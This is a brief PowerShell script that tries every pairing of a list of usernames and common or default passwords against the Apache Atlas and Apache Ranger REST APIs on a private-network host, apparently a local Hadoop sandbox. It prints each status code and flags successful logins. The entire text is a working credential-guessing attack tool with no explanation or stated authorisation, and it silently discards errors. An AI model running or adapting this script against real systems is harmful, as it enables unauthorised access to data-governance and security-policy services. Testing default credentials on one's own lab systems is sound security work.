$vmIp = "192.168.110.131"
$users = @("admin", "raj_ops", "atlas", "rangeradmin", "holger_gov")
$passwords = @("admin", "admin123", "hadoop", "raj_ops", "atlas", "rangeradmin", "holger_gov", "password")

$atlasUrl = "http://$vmIp:21000/api/atlas/v2/types/typedefs"
$rangerUrl = "http://$vmIp:6080/service/public/v2/api/service/definitions"

Write-Host "--- Testing Apache Atlas ---"
foreach ($u in $users) {
    foreach ($p in $passwords) {
        $pair = "$($u):$($p)"
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
        $base64 = [System.Convert]::ToBase64String($bytes)
        $headers = @{ "Authorization" = "Basic $base64" }
        
        try {
            $resp = Invoke-WebRequest -Uri $atlasUrl -Headers $headers -Method Get -ErrorAction SilentlyContinue
            Write-Host "Atlas: $u : $p -> $($resp.StatusCode)"
            if ($resp.StatusCode -eq 200) {
                Write-Host "SUCCESS: Atlas login works with $u : $p"
            }
        } catch {
            # Skip errors
        }
    }
}

Write-Host "`n--- Testing Apache Ranger ---"
foreach ($u in $users) {
    foreach ($p in $passwords) {
        $pair = "$($u):$($p)"
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
        $base64 = [System.Convert]::ToBase64String($bytes)
        $headers = @{ "Authorization" = "Basic $base64" }
        
        try {
            $resp = Invoke-WebRequest -Uri $rangerUrl -Headers $headers -Method Get -ErrorAction SilentlyContinue
            Write-Host "Ranger: $u : $p -> $($resp.StatusCode)"
            if ($resp.StatusCode -eq 200) {
                Write-Host "SUCCESS: Ranger login works with $u : $p"
            }
        } catch {
            # Skip errors
        }
    }
}
